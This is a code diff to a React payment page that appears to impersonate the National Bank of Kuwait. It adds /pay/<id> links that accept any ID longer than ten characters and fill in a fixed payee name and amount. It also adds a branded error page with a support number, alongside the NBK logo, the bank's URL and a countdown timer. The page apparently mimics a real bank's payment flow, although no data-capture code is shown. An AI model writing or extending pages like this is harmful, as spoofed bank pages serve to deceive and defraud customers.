@@ -12,13 +12,40 @@ export default function NBKPaymentPage() {
   const [timeRemaining, setTimeRemaining] = useState(120); // 2 minutes
   
   // استخراج البيانات من URL إذا كانت متوفرة
+  const [paymentId, setPaymentId] = useState<string | null>(null);
+  const [isValidPayment, setIsValidPayment] = useState(true);
+  
   useEffect(() => {
     const urlParams = new URLSearchParams(window.location.search);
     const recipientFromUrl = urlParams.get('n');
     const amountFromUrl = urlParams.get('a');
     const purposeFromUrl = urlParams.get('p');
     
-    if (recipientFromUrl && amountFromUrl && purposeFromUrl) {
+    // استخراج معرف الدفع من المسار /pay/payment_id
+    const path = window.location.pathname;
+    const payMatch = path.match(/\/pay\/(.+)/);
+    
+    if (payMatch) {
+      const extractedPaymentId = payMatch[1];
+      setPaymentId(extractedPaymentId);
+      
+      // التحقق من صحة معرف الدفع (يجب أن يحتوي على الأقل على أرقام أو أحرف)
+      if (extractedPaymentId && extractedPaymentId.length > 10) {
+        setIsValidPayment(true);
+        // تعيين البيانات الافتراضية للدفع
+        setPaymentInfo({
+          recipientName: "يوسف غازي الرشيدي",
+          amount: "30.000",
+          currency: "د.ك",
+          purpose: "Family Support",
+          beneficiary: "NBK",
+          website: "https://online.nbk.com.kw"
+        });
+      } else {
+        setIsValidPayment(false);
+      }
+    } else if (recipientFromUrl && amountFromUrl && purposeFromUrl) {
+      // الطريقة القديمة للمعاملات عبر query parameters
       setPaymentInfo({
         recipientName: decodeURIComponent(recipientFromUrl),
         amount: amountFromUrl,
@@ -32,7 +59,7 @@ export default function NBKPaymentPage() {
 
   // معلومات الدفع (القيم الافتراضية)
   const [paymentInfo, setPaymentInfo] = useState({
-    recipientName: "يوسف غازي صلاح الرشيدي",
+    recipientName: "يوسف غازي الرشيدي",
     amount: "30.000",
     currency: "د.ك",
     purpose: "Family Support",
@@ -432,7 +459,39 @@ export default function NBKPaymentPage() {
     </div>
   );
 
+  const renderErrorPage = () => (
+    <div className="min-h-screen bg-white flex flex-col items-center justify-center px-4">
+      {/* شعار NBK */}
+      <div className="mb-8">
+        <img src="/nbk-logo.jpg" alt="بنك الكويت الوطني" className="h-16" />
+      </div>
+      
+      {/* رسالة الخطأ */}
+      <div className="text-center mb-8">
+        <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
+          <AlertCircle className="w-10 h-10 text-red-600" />
+        </div>
+        
+        <h2 className="text-xl font-bold text-red-800 mb-2">لم يتم العثور على الطلب</h2>
+        <p className="text-gray-600 text-sm max-w-md">
+          معذرة، الرابط غير صحيح أو منتهي الصلاحية. يرجى التأكد من الرابط والمحاولة مرة أخرى.
+        </p>
+      </div>
+      
+      {/* معلومات الدعم */}
+      <div className="w-full max-w-md bg-gray-50 border border-gray-300 rounded-lg p-6 text-center">
+        <p className="text-sm text-gray-700 mb-2">للاستفسار والدعم:</p>
+        <p className="font-bold text-blue-800">1801801</p>
+      </div>
+    </div>
+  );
+
   const renderCurrentPage = () => {
+    // إذا كان هناك معرف دفع في الرابط ولكنه غير صحيح
+    if (paymentId && !isValidPayment) {
+      return renderErrorPage();
+    }
+    
     switch (currentView) {
       case 'confirmation':
         return renderConfirmationPage();
